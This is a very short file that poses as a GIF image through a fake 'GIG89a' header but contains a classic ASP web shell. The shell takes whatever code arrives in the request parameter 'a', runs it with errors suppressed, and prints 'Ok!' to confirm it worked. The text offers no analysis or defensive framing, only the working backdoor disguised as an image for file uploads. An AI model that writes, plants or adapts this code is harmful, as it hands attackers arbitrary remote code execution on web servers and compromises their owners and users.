GIG89a	
<%
dim a
a=request(chr(97))
on error resume next
execute a
response.write("Ok!")
%>